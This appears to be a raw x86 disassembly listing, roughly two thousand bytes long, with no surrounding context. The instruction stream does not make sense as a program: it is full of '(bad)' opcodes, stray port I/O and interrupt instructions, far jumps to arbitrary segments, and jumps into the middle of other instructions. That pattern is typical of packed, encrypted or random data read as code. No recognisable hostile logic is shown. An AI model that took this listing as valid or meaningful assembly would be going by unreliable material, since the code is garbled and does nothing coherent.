  4201d8:	push   0x654ac34f
  4201dd:	into   
  4201de:	sahf   
  4201df:	and    eax,0xff7df130
  4201e4:	cmp    ebx,DWORD PTR gs:[eax+0x1dda2a84]
  4201eb:	jmp    0x55234d79
  4201f0:	xor    eax,0xfd12c7fa
  4201f5:	das    
  4201f6:	ret    
  4201f7:	fadd   QWORD PTR [ebp*1-0x266ed907]
  4201fe:	cmp    bl,BYTE PTR [esi-0x28]
  420201:	mov    ds:0x5dc7a1c5,al
  420206:	add    ah,BYTE PTR [ebx+ebp*4]
  420209:	pop    ebp
  42020a:	jns    0x4201be
  42020c:	icebp  
  42020d:	inc    ebp
  42020e:	adc    ebx,DWORD PTR [ebx]
  420210:	lds    ebx,FWORD PTR ds:0x9e40de15
  420216:	xor    esi,DWORD PTR [ebx+edx*1+0x12bdc9ac]
  42021d:	bswap  edi
  42021f:	in     eax,0xe0
  420221:	xor    dl,ch
  420223:	add    al,0x4c
  420225:	lahf   
  420226:	ror    BYTE PTR ds:0xdb544bc3,1
  42022c:	in     eax,dx
  42022d:	inc    esp
  42022e:	sub    al,0x63
  420230:	inc    edi
  420231:	pushf  
  420232:	jge    0x42020e
  420234:	inc    esp
  420235:	dec    ecx
  420236:	scas   al,BYTE PTR es:[edi]
  420237:	adc    eax,0xb55de55d
  42023c:	adc    al,bh
  42023e:	or     DWORD PTR [edi],0x16
  420241:	cdq    
  420242:	test   DWORD PTR [edi],ecx
  420244:	in     eax,0x5
  420246:	test   al,0xd4
  420248:	jp     0x42023f
  42024a:	mov    al,ds:0x570e17fc
  42024f:	push   ecx
  420250:	aad    0xfb
  420252:	pop    es
  420253:	jge    0x42029d
  420255:	fld    DWORD PTR [ecx]
  420257:	xor    al,0x84
  420259:	add    eax,DWORD PTR [eax]
  42025b:	jno    0x42026a
  42025d:	xor    eax,0x98e6fca0
  420262:	div    cl
  420264:	in     al,0xa2
  420266:	fwait
  420267:	xchg   ebp,eax
  420268:	sbb    eax,0xd6a43bf
  42026d:	shl    ebx,cl
  42026f:	jne    0x4202ce
  420271:	out    dx,al
  420272:	retf   
  420273:	adc    BYTE PTR [edx],0xc
  420276:	add    bl,cl
  420278:	dec    ecx
  420279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42027b:	add    esi,DWORD PTR [ecx+0x5c]
  42027e:	sbb    BYTE PTR [eax+eiz*8+0x46],0x75
  420283:	jno    0x420257
  420285:	stc    
  420286:	std    
  420287:	jg     0x4202d7
  420289:	out    0x2b,al
  42028b:	mov    esi,DWORD PTR [esi]
  42028d:	jp     0x42025f
  42028f:	mov    cl,0xa2
  420291:	or     al,0x14
  420293:	pop    ebp
  420294:	stos   DWORD PTR es:[edi],eax
  420295:	lock push eax
  420297:	stc    
  420298:	mov    WORD PTR [eax+eax*8-0x7ab10768],ds
  42029f:	cs out 0x91,al
  4202a2:	int    0xb1
  4202a4:	adc    cl,BYTE PTR [edx+ebx*8]
  4202a7:	mov    ds:0xb3f729f5,eax
  4202ac:	pop    esp
  4202ad:	and    al,0xa1
  4202af:	rcl    DWORD PTR [esi+0x68268f4d],cl
  4202b5:	mov    cl,0x23
  4202b7:	add    ah,BYTE PTR ds:0x732349cd
  4202bd:	in     al,dx
  4202be:	sti    
  4202bf:	into   
  4202c0:	aas    
  4202c1:	sub    eax,0xb9214cca
  4202c6:	mov    eax,0xb0d64efa
  4202cb:	mov    ch,0x7d
  4202cd:	shl    BYTE PTR [eax+0x5903d919],cl
  4202d3:	sub    DWORD PTR [ebx+0x57],ebp
  4202d6:	add    al,0xaa
  4202d8:	xlat   BYTE PTR ds:[ebx]
  4202d9:	add    DWORD PTR [ebp-0x1a],edx
  4202dc:	nop
  4202dd:	push   ebp
  4202de:	push   0xffffffe2
  4202e0:	sahf   
  4202e1:	or     BYTE PTR [ebx],ch
  4202e3:	add    eax,0x9a637b08
  4202e8:	loopne 0x42034c
  4202ea:	sbb    al,0xea
  4202ec:	mov    bh,0x5d
  4202ee:	push   ss
  4202ef:	or     al,0x3d
  4202f1:	adc    DWORD PTR [ecx-0x1c],esi
  4202f4:	push   eax
  4202f5:	lahf   
  4202f6:	lahf   
  4202f7:	fmul   DWORD PTR [edi-0x4dcee121]
  4202fd:	or     BYTE PTR [eax],ah
  4202ff:	arpl   WORD PTR [ecx+0xa],bp
  420302:	test   BYTE PTR [ecx],dl
  420304:	cmc    
  420305:	push   esi
  420306:	pop    es
  420307:	jge    0x420312
  420309:	fstp   QWORD PTR [ecx+0x6a7ecdae]
  42030f:	sub    BYTE PTR [ebp+0x61],bh
  420312:	sub    DWORD PTR [esp+eiz*2],edi
  420315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420316:	rol    BYTE PTR ds:0xd38bfdf9,0x13
  42031d:	fld    QWORD PTR [eax-0x74]
  420320:	jbe    0x420374
  420322:	jmp    0x4202ca
  420324:	fstp   DWORD PTR [ecx+0x4cb497e3]
  42032a:	daa    
  42032b:	xor    eax,0x3cb3c514
  420330:	mov    ds:0x98ad0766,eax
  420335:	imul   BYTE PTR [ebp+0x7d]
  420338:	push   eax
  420339:	jbe    0x420399
  42033b:	inc    ecx
  42033c:	out    dx,eax
  42033d:	adc    dh,BYTE PTR [edi+0x739b56ce]
  420343:	lahf   
  420344:	lods   al,BYTE PTR ds:[esi]
  420345:	mov    al,0xcc
  420347:	das    
  420348:	(bad)
  42034b:	push   0xa0660f5f
  420350:	xchg   edi,eax
  420351:	lds    ebx,FWORD PTR [esp+ebp*1+0x42]
  420355:	mov    bh,0xd
  420357:	retf   
  420358:	dec    ecx
  420359:	xor    eax,0xe9173930
  42035e:	leave  
  42035f:	fcmovnu st,st(2)
  420361:	gs pushf 
  420363:	enter  0xa32f,0x30
  420367:	mov    bh,0xe6
  420369:	sbb    edx,DWORD PTR [esi-0x484c3269]
  42036f:	mov    edi,0xb70e5afc
  420374:	mov    ecx,0xf42d5a0f
  420379:	hlt    
  42037a:	out    0x20,eax
  42037c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42037d:	jmp    0x420345
  42037f:	test   BYTE PTR [eax],cl
  420381:	sub    eax,DWORD PTR [ebp+0x1]
  420384:	aad    0xc7
  420386:	bound  esi,QWORD PTR [ecx-0x1d9813aa]
  42038c:	nop
  42038d:	mov    al,ds:0x454d8078
  420392:	sub    eax,0x2803c2f
  420397:	mov    dh,0x33
  420399:	aad    0x2b
  42039b:	dec    ebp
  42039c:	xchg   ebp,eax
  42039d:	aam    0x5d
  42039f:	aaa    
  4203a0:	or     ch,BYTE PTR [esi]
  4203a2:	push   edx
  4203a3:	add    eax,0xfbc5c217
  4203a8:	adc    al,0x26
  4203aa:	stc    
  4203ab:	xchg   ecx,eax
  4203ac:	stos   BYTE PTR es:[edi],al
  4203ad:	fidiv  WORD PTR [edx]
  4203af:	pop    esi
  4203b0:	in     eax,0xf0
  4203b2:	into   
  4203b3:	sub    eax,0xee0e0ddb
  4203b8:	stc    
  4203b9:	js     0x4203f2
  4203bb:	cld    
  4203bc:	mov    bl,0xf2
  4203be:	or     dh,BYTE PTR [ecx]
  4203c0:	sbb    ecx,ebp
  4203c2:	retf   
  4203c3:	xchg   esp,eax
  4203c4:	rcr    DWORD PTR [ebx-0x4eb12930],1
  4203ca:	mov    bh,0x3a
  4203cc:	mov    bh,ah
  4203ce:	and    dl,BYTE PTR [eax-0x7d76df53]
  4203d4:	cmp    DWORD PTR ds:0x669a2b64,ebx
  4203da:	jecxz  0x420433
  4203dc:	sub    eax,0x881600ff
  4203e1:	push   cs
  4203e2:	ja     0x420463
  4203e4:	xor    DWORD PTR [esp+ecx*1+0x21d13768],edi
  4203eb:	daa    
  4203ec:	adc    DWORD PTR [edi],edi
  4203ee:	loop   0x4203eb
  4203f0:	(bad)  
  4203f1:	call   0xeac31940
  4203f6:	nop
  4203f7:	sbb    BYTE PTR [esi-0x2c],bh
  4203fa:	fs jl  0x420441
  4203fd:	inc    edx
  4203fe:	jbe    0x42043a
  420400:	and    edi,eax
  420402:	icebp  
  420403:	jge    0x420417
  420405:	sbb    bl,bh
  420407:	aam    0x91
  420409:	nop
  42040a:	push   edi
  42040b:	sar    ecx,cl
  42040d:	ja     0x4203dd
  42040f:	pop    eax
  420410:	add    al,0x5d
  420412:	push   esi
  420413:	into   
  420414:	out    0xc0,al
  420416:	mov    ebx,0x5cf9a3be
  42041b:	mov    ds:0xda9d610d,al
  420420:	or     al,0x1c
  420422:	inc    edi
  420423:	not    ebx
  420425:	fadd   QWORD PTR [ecx+0x17]
  420428:	(bad)  
  420429:	push   ebx
  42042a:	into   
  42042b:	cmp    al,0x0
  42042d:	push   ds
  42042e:	jecxz  0x420420
  420430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420431:	jmp    0x6982:0x2c2e4ccf
  420438:	daa    
  420439:	(bad)  [edx]
  42043b:	(bad)  
  42043c:	pop    esi
  42043d:	loopne 0x42045a
  42043f:	pop    ebx
  420440:	pop    ecx
  420441:	js     0x420432
  420443:	pop    edx
  420444:	sbb    DWORD PTR [ecx+0x6b],ecx
  420447:	cmp    dl,bh
  420449:	jae    0x420459
  42044b:	in     al,0xb1
  42044d:	lock lahf 
  42044f:	dec    ebx
  420450:	adc    ebx,ebx
  420452:	pop    ss
  420453:	or     eax,0x4adce768
  420458:	mov    bl,0x6c
  42045a:	jno    0x420437
  42045c:	ins    BYTE PTR es:[edi],dx
  42045d:	and    BYTE PTR [ebp-0xd],bh
  420460:	aad    0xe8
  420462:	fwait
  420463:	adc    edx,DWORD PTR [eax+edx*2]
  420466:	lds    ebp,FWORD PTR [ebp-0x46]
  420469:	pop    ds
  42046a:	ret    
  42046b:	inc    ebx
  42046c:	lea    esp,[eax]
  42046e:	cmp    DWORD PTR [ebp-0x1f],esi
  420471:	dec    ebp
  420472:	aam    0x32
  420474:	ficomp WORD PTR [ecx+0x39d7a9cc]
  42047a:	jmp    0x6ba:0x2e7bed74
  420481:	cmp    eax,0x4316ca82
  420486:	adc    eax,0xb0fef53f
  42048b:	sti    
  42048c:	mov    bl,0x70
  42048e:	pop    es
  42048f:	adc    DWORD PTR [esp+esi*4],ebx
  420492:	or     DWORD PTR [edx+0x3556d226],eax
  420498:	add    BYTE PTR [eax+0x69],0xb7
  42049c:	fiadd  DWORD PTR [esi+0x60]
  42049f:	setne  BYTE PTR [ecx-0x71]
  4204a3:	sar    DWORD PTR [edx+0x6d],0xca
  4204a7:	scas   al,BYTE PTR es:[edi]
  4204a8:	mov    esi,0xa3b3e1c3
  4204ad:	pop    edx
  4204ae:	add    al,0xf
  4204b0:	mov    edi,DWORD PTR [edx]
  4204b2:	adc    DWORD PTR [ebp-0x1cf44abb],0xffffffa8
  4204b9:	push   cs
  4204ba:	gs push ecx
  4204bc:	outs   dx,BYTE PTR ds:[esi]
  4204bd:	stos   DWORD PTR es:[edi],eax
  4204be:	call   0xfde532a8
  4204c3:	outs   dx,DWORD PTR ds:[esi]
  4204c4:	pop    esi
  4204c5:	div    DWORD PTR [ebp+0x4]
  4204c8:	mov    ds:0xb6252e9f,eax
  4204cd:	sub    BYTE PTR [ebp+0x3c],ah
  4204d0:	stc    
  4204d1:	pop    es
  4204d2:	sahf   
  4204d3:	mov    ecx,0x2d2fd274
  4204d8:	neg    bh
  4204da:	ja     0x4204ff
  4204dc:	xchg   ecx,eax
  4204dd:	adc    ch,dh
  4204df:	sbb    al,0x93
  4204e1:	xchg   esi,eax
  4204e2:	fcom   DWORD PTR [esi-0x154fb09d]
  4204e8:	cmp    dl,BYTE PTR [esi]
  4204ea:	es cld 
  4204ec:	adc    BYTE PTR [ecx-0x76],dh
  4204ef:	sub    al,0x1e
  4204f1:	xor    al,0xbc
  4204f3:	scas   eax,DWORD PTR es:[edi]
  4204f4:	iret   
  4204f5:	inc    edx
  4204f6:	mov    ecx,0xd38eb98d
  4204fb:	shl    ebp,0x3
  4204fe:	xchg   esp,eax
  4204ff:	mov    bl,0x1e
  420501:	in     al,0x9f
  420503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420504:	inc    ecx
  420505:	(bad)  
  420506:	fstp   st(1)
  420508:	rcr    ebp,1
  42050a:	pushf  
  42050b:	inc    eax
  42050c:	jl     0x4204d6
  42050e:	lods   eax,DWORD PTR ds:[esi]
  42050f:	stos   BYTE PTR es:[edi],al
  420510:	(bad)  
  420511:	sar    BYTE PTR [edx-0x47],0xf1
  420515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420516:	ins    BYTE PTR es:[edi],dx
  420517:	push   edx
  420518:	cmp    ecx,DWORD PTR [edi]
  42051a:	xor    eax,0xffaa1fc7
  42051f:	std    
  420520:	arpl   WORD PTR [esi-0xc],di
  420523:	test   eax,0xad9dcf59
  420528:	in     eax,dx
  420529:	pop    ecx
  42052a:	xlat   BYTE PTR ds:[ebx]
  42052b:	mov    WORD PTR [esi-0x2767c2b6],cs
  420531:	lock jbe 0x420520
  420534:	and    DWORD PTR ds:0xbd6bf97b,0xffffffd0
  42053b:	push   es
  42053c:	stc    
  42053d:	push   ebx
  42053e:	fs push ax
  420541:	stos   BYTE PTR es:[edi],al
  420542:	aam    0x1f
  420544:	int    0xa7
  420546:	dec    edx
  420547:	push   cs
  420548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420549:	stc    
  42054a:	dec    esi
  42054b:	in     al,0x4d
  42054d:	mov    ah,0x11
  42054f:	ret    
  420550:	jge    0x420582
  420552:	(bad)  
  420554:	aaa    
  420555:	ret    
  420556:	clc    
  420557:	test   DWORD PTR [ecx],ebp
  420559:	lahf   
  42055a:	retf   0x6a59
  42055d:	sbb    bl,al
  42055f:	mov    bh,ch
  420561:	cmp    al,0x55
  420563:	(bad)  
  420564:	data16 in al,dx
  420566:	test   al,0x83
  420568:	aas    
  420569:	leave  
  42056a:	push   cs
  42056b:	dec    ecx
  42056c:	push   ecx
  42056d:	sub    eax,0x8a2df54a
  420572:	xor    BYTE PTR [edx],ah
  420574:	cmp    ah,BYTE PTR [edi+0x7b]
  420577:	mov    ah,0x5a
  420579:	std    
  42057a:	imul   edi,DWORD PTR [ebp+0x1e82f4fa],0x82fcd0e5
  420584:	pop    esi
  420585:	push   ds
  420586:	mov    ah,0x4c
  420588:	push   ss
  420589:	pushf  
  42058a:	pop    eax
  42058b:	xchg   esi,eax
  42058c:	cmp    dl,BYTE PTR [edx-0x7acf4ea]
  420592:	test   al,0x36
  420594:	sahf   
  420595:	jne    0x42059c
  420597:	test   BYTE PTR [edx-0x49],al
  42059a:	mov    dh,0x7b
  42059c:	retf   0x27d
  42059f:	ret    
  4205a0:	ds into 
  4205a2:	clc    
  4205a3:	jb     0x420617
  4205a5:	jecxz  0x4205ce
  4205a7:	dec    esp
  4205a8:	xchg   esi,eax
  4205a9:	mov    eax,0xd5b00bd1
  4205ae:	dec    esp
  4205af:	stc    
  4205b0:	leave  
  4205b1:	popa   
  4205b2:	inc    ecx
  4205b3:	or     eax,0x39a05ec6
  4205b8:	jecxz  0x420574
  4205ba:	ins    BYTE PTR es:[edi],dx
  4205bb:	pop    ds
  4205bc:	mov    ds:0x1f948a08,eax
  4205c1:	aam    0x2e
  4205c3:	inc    edx
  4205c4:	sbb    BYTE PTR [ebx-0x740191be],0xe1
  4205cb:	shr    BYTE PTR [edi+0x11104df],0x71
  4205d2:	mov    WORD PTR [edx+0x532fc90b],ds
  4205d8:	ftst   
  4205da:	push   eax
  4205db:	retf   0x423
  4205de:	fsub   st(3),st
  4205e0:	in     al,dx
  4205e1:	pop    ebp
  4205e2:	lods   al,BYTE PTR fs:[esi]
  4205e4:	imul   esi,DWORD PTR [edi-0x5d],0x3e
  4205e8:	or     cl,ah
  4205ea:	outs   dx,WORD PTR ds:[esi]
  4205ec:	(bad)  
  4205ed:	repnz xor BYTE PTR [esi],dh
  4205f0:	test   BYTE PTR [ebp+0x29],al
  4205f3:	mov    DWORD PTR [esi-0x7e5ab9a7],edx
  4205f9:	xchg   BYTE PTR [edi+0x63f338db],bh
  4205ff:	pop    ds
  420600:	dec    ebp
  420601:	mov    eax,ds:0xada4e0f4
  420606:	mov    ah,0x7f
  420608:	and    ch,bl
  42060a:	cmp    esp,DWORD PTR [esi]
  42060c:	xchg   esp,eax
  42060d:	xor    ecx,0xffffffdb
  420610:	std    
  420611:	sub    al,0xd8
  420613:	cmp    eax,0xd4f9e30
  420618:	scas   eax,DWORD PTR es:[edi]
  420619:	or     al,0x13
  42061b:	or     dh,dl
  42061d:	arpl   WORD PTR [esi+0x43e22f65],bx
  420623:	mov    ah,0xc6
  420625:	or     dh,BYTE PTR [edi-0xf]
  420628:	jmp    0x93e9c169
  42062d:	xchg   DWORD PTR ds:[eax+0x14803eb4],ebx
  420634:	es dec edi
  420636:	ror    DWORD PTR [eax-0x692af073],1
  42063c:	cmp    DWORD PTR [ecx-0x59],edx
  42063f:	and    BYTE PTR [ebp+0x2b],dh
  420642:	and    al,0x5
  420644:	and    bl,ch
  420646:	sub    eax,0x3c819af6
  42064b:	adc    eax,esi
  42064d:	push   ds
  42064e:	mov    eax,0xb3534b51
  420653:	call   0xa5ef:0x6e454c11
  42065a:	fldcw  WORD PTR [ebp+eax*4-0x66]
  42065e:	pushf  
  42065f:	jg     0x4205f7
  420661:	imul   DWORD PTR [ebx]
  420663:	jmp    0xe83457d0
  420668:	enter  0xc1c4,0xa1
  42066c:	or     edi,edi
  42066e:	stos   DWORD PTR es:[edi],eax
  42066f:	loopne 0x42069b
  420671:	inc    edx
  420672:	out    dx,al
  420673:	call   0x6be9:0xc4ab53bc
  42067a:	sbb    edx,0x34d2a82a
  420680:	mov    ch,0xb0
  420682:	test   al,0xad
  420684:	push   0x53
  420686:	in     eax,0x1b
  420688:	jno    0x420701
  42068a:	mov    ss,ebp
  42068c:	xchg   al,bh
  42068e:	scas   eax,DWORD PTR es:[edi]
  42068f:	gs in  eax,0x8a
  420692:	sub    bl,ch
  420694:	retf   0x71d7
  420697:	mov    ebx,0x1e54c5ee
  42069c:	(bad)  
  42069d:	aad    0xa4
  42069f:	fistp  DWORD PTR [edi+ecx*8-0x4b]
  4206a3:	pop    esi
  4206a4:	daa    
  4206a5:	shr    DWORD PTR [eax+0x3cbdafff],0x91
  4206ac:	fmul   DWORD PTR [ebp-0x61]
  4206af:	addr16 jle 0x4206f9
  4206b2:	mov    ch,0xcf
  4206b4:	dec    esi
  4206b5:	jp     0x4206cb
  4206b7:	inc    ebx
  4206b8:	jle    0x420716
  4206ba:	mov    ebx,0x9cc05326
  4206bf:	bound  edi,QWORD PTR [eax+0x4715c653]
  4206c5:	inc    eax
  4206c6:	and    dh,BYTE PTR [esi]
  4206c8:	repz loope 0x420679
  4206cb:	push   esp
  4206cc:	sub    eax,DWORD PTR [edi+0x3f275fa9]
  4206d2:	mov    esi,DWORD PTR [ecx+edi*1+0x79]
  4206d6:	jle    0x4206d6
  4206d8:	sbb    al,bh
  4206da:	icebp  
  4206db:	xor    esi,DWORD PTR [ecx+eiz*1+0x7a]
  4206df:	inc    esp
  4206e0:	xchg   DWORD PTR [edi-0x1c],edx
  4206e3:	sbb    BYTE PTR [eax-0x76],bh
  4206e6:	pop    ds
  4206e7:	jae    0x42066d
  4206e9:	inc    esp
  4206ea:	adc    BYTE PTR [esi-0x15],0x7e
  4206ee:	and    ecx,DWORD PTR [eax+0xb75e691]
  4206f4:	mov    ebx,0x8560c370
  4206f9:	lds    esp,FWORD PTR [edx-0x3b434851]
  4206ff:	jo     0x42069f
  420701:	push   0xe454708f
  420706:	repz aad 0xa4
  420709:	repnz sub eax,0x91d05ca3
  42070f:	dec    esi
  420710:	add    eax,0x5da6e21b
  420715:	mov    bl,0x46
  420717:	(bad)  
  420718:	arpl   WORD PTR [eax+0x57d33891],ax
  42071e:	mov    al,ds:0x3bfc64eb
  420723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420724:	int    0x21
  420726:	jno    0x420709
  420728:	mov    eax,ds:0xf71c4f5d
  42072d:	loop   0x420762
  42072f:	lods   eax,DWORD PTR ds:[esi]
  420730:	test   eax,0x74ab42ca
  420735:	fidivr WORD PTR [ecx-0x6b96c9de]
  42073b:	jnp    0x4206e6
  42073d:	xchg   edx,eax
  42073e:	enter  0x8478,0xcb
  420742:	or     DWORD PTR [edi+0x3fd81359],ebp
  420748:	int    0xbd
  42074a:	and    esp,DWORD PTR [ecx-0xa]
  42074d:	cdq    
  42074e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074f:	test   eax,0x95f12a9b
  420754:	jg     0x4207b2
  420756:	mov    ecx,ebp
  420758:	es (bad) 
  42075a:	addr16 jle 0x42076e
  42075d:	xchg   esi,eax
  42075e:	retf   0x3000
  420761:	and    esi,esi
  420763:	and    al,0xd3
  420765:	mov    al,0x1e
  420767:	mov    dl,0xc6
  420769:	lods   al,BYTE PTR ds:[esi]
  42076a:	pop    eax
  42076b:	cmp    edx,DWORD PTR [ebx+ecx*1+0x530a143]
  420772:	stos   DWORD PTR es:[edi],eax
  420773:	in     al,0xe8
  420775:	ja     0x420797
  420777:	or     ah,BYTE PTR [esi+0x2c]
  42077a:	ret    
  42077b:	stos   BYTE PTR es:[edi],al
  42077c:	fnstenv [ebp+0x1e]
  42077f:	pop    ds
  420780:	in     al,0x8f
  420782:	xor    al,0x9f
  420784:	mov    edi,0x65655afa
  420789:	dec    ebx
  42078a:	jecxz  0x420746
  42078c:	jne    0x420763
  42078e:	jmp    0x42071f
  420790:	lea    ebx,[eax+0x4a]
  420793:	pop    ebp
  420794:	cmp    al,0x0
  420796:	retf   0xc6a
  420799:	sub    eax,0x51f921c4
  42079e:	dec    ebp
  42079f:	mov    WORD PTR [ecx+0x70acec8c],gs
  4207a5:	jp     0x420805
  4207a7:	pop    ebp
  4207a8:	xchg   ecx,eax
  4207a9:	and    eax,0xc54f67ec
  4207ae:	je     0x420803
  4207b0:	in     eax,0xd1
  4207b2:	pusha  
  4207b3:	mov    ax,ds:0x5d59233
  4207b9:	aad    0xd5
  4207bb:	es add dl,0x7e
  4207bf:	mov    DWORD PTR [edx-0x51],0x2ce5c88a
  4207c6:	js     0x42074d
  4207c8:	xor    ah,BYTE PTR ds:0xd0f5195f
  4207ce:	jmp    0x42082d
  4207d0:	pop    ss
  4207d1:	add    BYTE PTR [ebx],ch
  4207d3:	pop    ss
  4207d4:	stos   DWORD PTR es:[edi],eax
  4207d5:	hlt    
  4207d6:	ins    DWORD PTR es:[edi],dx
  4207d7:	je     0x4207d9
  4207d9:	dec    si
  4207db:	cmp    eax,0x7dd01559
  4207e0:	stos   BYTE PTR es:[edi],al
  4207e1:	neg    DWORD PTR [edi+0x20]
  4207e4:	test   eax,0x8d2c357
  4207e9:	ror    DWORD PTR [eax+0x6dd57352],cl
  4207ef:	jo     0x4207a7
  4207f1:	or     DWORD PTR [ebx+0x42f55e5a],ebx
  4207f7:	and    eax,0x61e2d3ce
  4207fc:	repnz repz fistp DWORD PTR [eax]
  420800:	fsincos 
  420802:	lds    ebx,FWORD PTR [edi-0x4150e6d9]
  420808:	cmc    
  420809:	ret    0x8663
  42080c:	jmp    0x666c5a2d
  420811:	cmp    al,0x9b
  420813:	dec    eax
  420814:	mov    dl,0x9d
  420816:	push   edx
  420817:	push   ecx
  420818:	mov    ebp,0x80203591
  42081d:	stc    
  42081e:	pop    ebp
  42081f:	sub    BYTE PTR [edi-0x111e09d9],cl
  420825:	dec    esi
  420826:	imul   esp,edx,0xfffffff6
  420829:	std    
  42082a:	or     BYTE PTR [esi],ch
  42082c:	push   edi
  42082d:	mov    ch,0xdf
  42082f:	arpl   WORD PTR ss:[ecx],di
  420832:	mov    BYTE PTR [esp+ecx*8+0x32],ch
  420836:	std    
  420837:	pop    ds
  420838:	lods   eax,DWORD PTR ds:[esi]
  420839:	aas    
  42083a:	inc    ebx
  42083b:	xchg   ebp,eax
  42083c:	sbb    DWORD PTR [esi-0x2e9287e6],0xa3105945
  420846:	push   es
  420847:	and    eax,0xc0116571
  42084c:	lock fs jno 0x420884
  420850:	jecxz  0x4208bd
  420852:	mov    dh,bl
  420854:	imul   eax,DWORD PTR [ebp+0x3181d71c],0xde08b917
  42085e:	xor    BYTE PTR [ebp-0x566a4ddd],dl
  420864:	add    cl,cl
  420866:	(bad)  
  420867:	adc    BYTE PTR [edx],dh
  420869:	jge    0x420897
  42086b:	xor    eax,0xc6dce461
  420870:	outs   dx,DWORD PTR ds:[esi]
  420871:	sub    DWORD PTR [eax-0x77],0xf
  420875:	dec    ebp
  420876:	sub    dl,BYTE PTR [ecx+0x58833c2b]
  42087c:	dec    ebx
  42087d:	mov    bh,0x87
  42087f:	outs   dx,DWORD PTR ds:[esi]
  420880:	into   
  420881:	dec    edi
  420882:	in     eax,dx
  420883:	add    DWORD PTR [eax-0x5b],esp
  420886:	cmp    ecx,DWORD PTR [ebp+0x7f]
  420889:	les    ebx,FWORD PTR [edx-0x4cbb8719]
  42088f:	lds    edi,FWORD PTR [ecx+0x79]
  420892:	push   ss
  420893:	mov    dh,0x10
  420895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420896:	mov    cl,0x9
  420898:	mov    ah,0xd6
  42089a:	shl    DWORD PTR [edx],1
  42089c:	xor    DWORD PTR [esi+edi*4+0x1541e818],esp
  4208a3:	add    eax,0xf8df20e0
  4208a8:	dec    ecx
  4208a9:	stos   BYTE PTR es:[edi],al
  4208aa:	sbb    BYTE PTR [edx+0xcb18d84],bl
  4208b0:	in     eax,dx
  4208b1:	push   cs
  4208b2:	adc    bh,0xa5
  4208b5:	clc    
  4208b6:	call   FWORD PTR [edx+0x3e37e79d]
  4208bc:	loopne 0x42093b
  4208be:	in     al,dx
  4208bf:	mov    bh,0x74
  4208c1:	sbb    eax,0x394d5ae9
  4208c6:	mov    bh,0xd
  4208c8:	push   edx
  4208c9:	mov    BYTE PTR [ebx+0x61],al
  4208cc:	xchg   DWORD PTR [ebp-0x75],ebx
  4208cf:	lods   eax,DWORD PTR ds:[esi]
  4208d0:	sbb    eax,0xab4a0aba
  4208d6:	test   esi,esp
  4208d8:	sbb    BYTE PTR [edi+0x3e],al
  4208db:	push   es
  4208dc:	mov    ah,0x9b
  4208de:	gs inc eax
  4208e0:	test   eax,0x1e339b85
  4208e5:	adc    edx,DWORD PTR [edx]
  4208e7:	inc    edi
  4208e8:	xchg   ebx,eax
  4208e9:	(bad)  
  4208ea:	jmp    0xa099:0xe8af6a70
  4208f1:	clc    
  4208f2:	aam    0x74
  4208f4:	xchg   edx,eax
  4208f5:	out    0x2c,eax
  4208f7:	inc    ebx
  4208f8:	pop    esi
  4208f9:	xor    BYTE PTR [edi],ch
  4208fb:	sub    DWORD PTR [ecx-0x21],0x2a5cb338
  420902:	sbb    DWORD PTR [ebx],ebx
  420904:	cmp    esi,DWORD PTR [edx]
  420906:	or     BYTE PTR [ecx+0x294fe831],dh
  42090c:	mov    ds:0x1fd31d70,eax
  420911:	pop    esi
  420912:	jbe    0x420993
  420914:	dec    ebp
  420915:	jmp    0x1bc1619e
  42091a:	ins    DWORD PTR es:[edi],dx
  42091b:	push   esp
  42091c:	pop    eax
  42091d:	mov    esp,0x497af6a0
  420922:	shl    WORD PTR [esi-0xc],1
  420926:	sti    
  420927:	xor    al,0x5d
  420929:	ins    DWORD PTR es:[edi],dx
  42092a:	rcr    BYTE PTR [ebp-0x1b1a629b],cl
  420930:	push   edx
  420931:	arpl   WORD PTR [edi+0x4a81417f],ax
  420937:	xor    al,0xfa
  420939:	or     al,0x4a
  42093b:	pop    eax
  42093c:	popa   
  42093d:	ret    
  42093e:	jb     0x420943
  420940:	add    eax,0x89585de4
  420945:	ret    
  420946:	(bad)  
  420948:	mov    es,WORD PTR [ecx+0x2]
  42094b:	push   0x13
  42094d:	outs   dx,DWORD PTR ds:[esi]
  42094e:	dec    edi
  42094f:	xchg   edi,eax
  420950:	retf   
  420951:	mul    DWORD PTR [esp+eax*8+0x1f]
  420955:	add    dh,BYTE PTR [ecx-0x438fb998]
  42095b:	or     DWORD PTR [ecx],edx
  42095d:	xchg   edx,eax
  42095e:	aaa    
  42095f:	sbb    ebp,DWORD PTR ds:0x2caa4f10
  420965:	jmp    0xf3ae8015
  42096a:	and    ch,BYTE PTR [edi]
  42096c:	cs lea edi,es:[ebp+edx*8+0x29]
  420972:	aam    0x32
  420974:	addr16 test eax,0xddca5f55
  42097a:	or     ebx,DWORD PTR [ebx+edi*1+0x7f995b98]
  420981:	in     eax,0x59
  420983:	ficom  DWORD PTR [edi]
  420985:	mov    eax,0xa4e9f3b7
  42098a:	mov    ds:0x75e971be,eax
  42098f:	mov    esp,0x66cf7180
  420994:	loopne 0x4209d1
  420996:	dec    DWORD PTR [ebp-0x3bfc11bf]
  42099c:	adc    eax,0xf374fc0f
  4209a1:	stos   DWORD PTR es:[edi],eax
  4209a2:	push   ebp
  4209a3:	outs   dx,DWORD PTR ds:[esi]
  4209a4:	fstp   TBYTE PTR [edi-0x3c6657d1]
  4209aa:	aaa    
  4209ab:	call   0x9c970d01
  4209b0:	sbb    eax,0x3750194c
  4209b5:	das    
  4209b6:	lahf   
  4209b7:	jnp    0x420a24
  4209b9:	pop    esp
  4209ba:	mov    eax,ds:0xacf04eae
  4209bf:	jecxz  0x42098f
  4209c1:	shl    DWORD PTR [ebp+0x49],0x84
  4209c5:	test   DWORD PTR [edi+0x4],ecx
  4209c8:	jmp    0x7d05:0xdf2a7da9
  4209cf:	(bad)  
  4209d0:	jecxz  0x420993
  4209d2:	les    esi,FWORD PTR [esi-0x5455811b]
  4209d8:	iret   
  4209d9:	push   edx
  4209da:	sub    ah,BYTE PTR [ecx-0x5a]
